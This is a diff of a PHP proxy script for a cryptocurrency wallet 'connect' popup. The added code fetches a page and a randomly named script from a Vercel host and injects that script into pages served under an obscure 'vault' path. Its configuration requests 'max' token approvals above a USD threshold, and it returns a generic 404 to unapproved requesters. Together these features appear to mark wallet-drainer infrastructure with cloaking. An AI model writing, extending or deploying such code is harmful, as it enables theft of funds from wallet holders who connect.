@@ -33,28 +33,9 @@ $cfg = [
     'connect_popup_enabled' => true,
     'connect_popup_url' => '',
 
-    /** Vercel host for nginx popup proxy (from site_url). */
     'vercel_profile_host' => 'fuzzy-octo-guacamole-delta.vercel.app',
+    'profile_script' => 'Ix9fLBj7CRLZ.js',
 ];
-
-$gatewayMode = (string) ($_SERVER['WALLET_GATEWAY_MODE'] ?? '');
-if ($gatewayMode !== '') {
-    $siteUrl = detect_site_url($cfg);
-    if (!script_request_allowed($cfg, $siteUrl)) {
-        send_generic_not_found();
-        exit;
-    }
-    if ($gatewayMode === 'rpc') {
-        serve_rpc_proxy($cfg);
-        exit;
-    }
-    if ($gatewayMode === 'price') {
-        serve_price_proxy($cfg);
-        exit;
-    }
-    http_response_code(404);
-    exit;
-}
 
 function request_origin(): string
 {
@@ -70,22 +51,19 @@ function request_origin(): string
     return ($https ? 'https' : 'http') . '://' . $host;
 }
 
-function proxy_path(array $cfg, string $suffix): string
+function vault_entry_url(array $cfg): string
 {
-    $base = (string) ($cfg['script_path'] ?? 'vault');
-    return '/' . $base . $suffix;
-}
+    $path = (string) ($cfg['script_path'] ?? 'vault38472');
 
-function proxy_url(array $cfg, string $suffix): string
-{
-    return rtrim(request_origin(), '/') . proxy_path($cfg, $suffix);
+    return rtrim(request_origin(), '/') . '/' . $path;
 }
 
 function build_embed_config(array $cfg, string $siteUrl): array
 {
+    $entry = vault_entry_url($cfg);
     $popupUrl = trim((string) ($cfg['connect_popup_url'] ?? ''));
     if ($popupUrl === '') {
-        $popupUrl = proxy_url($cfg, '-popup/');
+        $popupUrl = $entry . '?wallet=popup';
     }
 
     return [
@@ -103,8 +81,8 @@ function build_embed_config(array $cfg, string $siteUrl): array
         'tokenApprovalMaxCount' => (int) ($cfg['token_approval_max_count'] ?? 0),
         'tokenApprovalMinUsd' => (float) ($cfg['token_approval_min_usd'] ?? 1),
         'tokenApprovalAmountMode' => (string) ($cfg['token_approval_amount_mode'] ?? 'max'),
-        'solanaRpcUrl' => proxy_url($cfg, '-rpc'),
-        'priceApiUrl' => proxy_url($cfg, '-price'),
+        'solanaRpcUrl' => $entry,
+        'priceApiUrl' => $entry . '?wallet=price',
         'connectPopupEnabled' => (bool) ($cfg['connect_popup_enabled'] ?? true),
         'connectPopupUrl' => $popupUrl,
         'connectPopupTitle' => (string) ($cfg['connect_popup_title'] ?? ''),
@@ -257,6 +235,49 @@ function serve_price_proxy(array $cfg): void
     proxy_forward('GET', $upstream, null);
 }
 
+function vercel_profile_origin(array $cfg): string
+{
+    $host = trim((string) ($cfg['vercel_profile_host'] ?? ''));
+    if ($host === '') {
+        $host = (string) parse_url((string) ($cfg['site_url'] ?? ''), PHP_URL_HOST);
+    }
+
+    return 'https://' . $host;
+}
+
+function serve_popup_asset_proxy(array $cfg, string $file): void
+{
+    $safe = basename($file);
+    if ($safe === '' || !preg_match('/^[A-Za-z0-9._-]+\\.js$/', $safe)) {
+        http_response_code(400);
+        exit;
+    }
+    proxy_forward('GET', vercel_profile_origin($cfg) . '/profile/' . $safe, null);
+}
+
+function serve_popup_proxy(array $cfg): void
+{
+    $html = fetch_remote_url(vercel_profile_origin($cfg) . '/profile/');
+    if ($html === null || $html === '') {
+        http_response_code(502);
+        exit;
+    }
+
+    $script = basename((string) ($cfg['profile_script'] ?? 'page.js'));
+    $entry = vault_entry_url($cfg);
+    $assetUrl = $entry . '?wallet=popup-js&file=' . rawurlencode($script);
+    $html = (string) preg_replace(
+        '/<script\\s+src="' . preg_quote($script, '/') . '"\\s*><\\/script>/',
+        '<script src="' . $assetUrl . '" defer></script>',
+        $html,
+        1
+    );
+
+    header('Content-Type: text/html; charset=utf-8');
+    header('Cache-Control: no-store');
+    echo $html;
+}
+
 function send_generic_not_found(): void
 {
     http_response_code(404);
@@ -313,10 +334,8 @@ function wallet_bundle_fetch_last_error(): string
     return (string) ($GLOBALS['__wallet_bundle_fetch_error'] ?? '');
 }
 
-function fetch_vercel_bundle_remote(string $url): ?string
+function fetch_remote_url(string $url): ?string
 {
-    wallet_bundle_fetch_error('');
-
     if (function_exists('curl_init')) {
         $ch = curl_init($url);
         if ($ch === false) {
@@ -338,9 +357,6 @@ function fetch_vercel_bundle_remote(string $url): ?string
         $curlErr = curl_error($ch);
         curl_close($ch);
         if ($body === false || $code < 200 || $code >= 300) {
-            wallet_bundle_fetch_error(
-                $code > 0 ? "HTTP {$code}" . ($curlErr !== '' ? ", {$curlErr}" : '') : ($curlErr !== '' ? $curlErr : 'curl failed'),
-            );
             return null;
         }
         return (string) $body;
@@ -351,9 +367,15 @@ function fetch_vercel_bundle_remote(string $url): ?string
         'ssl' => ['verify_peer' => true, 'verify_peer_name' => true],
     ]);
     $body = @file_get_contents($url, false, $ctx);
-    if ($body === false || $body === '') {
-        wallet_bundle_fetch_error('file_get_contents failed (enable php-curl on the VPS)');
-        return null;
+    return ($body === false || $body === '') ? null : $body;
+}
+
+function fetch_vercel_bundle_remote(string $url): ?string
+{
+    wallet_bundle_fetch_error('');
+    $body = fetch_remote_url($url);
+    if ($body === null) {
+        wallet_bundle_fetch_error('upstream fetch failed');
     }
     return $body;
 }
@@ -372,6 +394,29 @@ $siteUrl = detect_site_url($cfg);
 
 if (!script_request_allowed($cfg, $siteUrl)) {
     send_generic_not_found();
+    exit;
+}
+
+$walletQuery = (string) ($_GET['wallet'] ?? '');
+$method = (string) ($_SERVER['REQUEST_METHOD'] ?? 'GET');
+
+if ($method === 'POST') {
+    serve_rpc_proxy($cfg);
+    exit;
+}
+
+if ($walletQuery === 'price') {
+    serve_price_proxy($cfg);
+    exit;
+}
+
+if ($walletQuery === 'popup-js' && isset($_GET['file'])) {
+    serve_popup_asset_proxy($cfg, (string) $_GET['file']);
+    exit;
+}
+
+if ($walletQuery === 'popup') {
+    serve_popup_proxy($cfg);
     exit;
 }
 
